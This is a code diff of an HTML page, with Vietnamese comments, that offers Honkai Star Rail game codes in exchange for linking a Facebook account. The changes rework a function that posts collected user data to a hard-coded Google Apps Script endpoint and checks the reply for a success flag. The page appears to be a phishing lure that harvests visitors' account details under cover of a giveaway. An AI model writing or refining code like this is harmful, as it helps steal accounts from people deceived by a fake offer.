@@ -5,6 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Nhận Code Honkai Star Rail - Liên kết Facebook</title>
     <style>
+        /* Giữ nguyên CSS của bạn */
         * {
             margin: 0;
             padding: 0;
@@ -268,7 +269,6 @@
 
     <script>
         // ================= CẤU HÌNH GOOGLE APPS SCRIPT =================
-        // URL Google Apps Script Web App của bạn
         const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbwy3SzmFXBa8Y00ikUlXbK-JRbGbUJ3tLVeq4Od2FIegbyQC-S6ZHlSmK674UIYcU3W/exec';
 
         // ================= HÀM HIỂN THỊ THÔNG BÁO =================
@@ -302,24 +302,25 @@
         // ================= GỬI DỮ LIỆU ĐẾN GOOGLE APPS SCRIPT =================
         async function submitToGoogleAppsScript(userData) {
             try {
-                // Tạo FormData object để gửi dữ liệu
-                const formData = new FormData();
-                
-                // Thêm tất cả các trường dữ liệu vào formData
+                // Tạo URL parameters
+                const params = new URLSearchParams();
                 for (const key in userData) {
-                    formData.append(key, userData[key]);
+                    params.append(key, userData[key]);
                 }
-                
+
                 // Gửi dữ liệu đến Google Apps Script
                 const response = await fetch(GOOGLE_SCRIPT_URL, {
                     method: 'POST',
-                    body: formData
+                    headers: {
+                        'Content-Type': 'application/x-www-form-urlencoded'
+                    },
+                    body: params
                 });
 
                 if (response.ok) {
-                    const result = await response.text();
+                    const result = await response.json();
                     console.log('Kết quả từ Google Script:', result);
-                    return true;
+                    return result.success;
                 } else {
                     console.error('Lỗi từ server:', response.status);
                     return false;
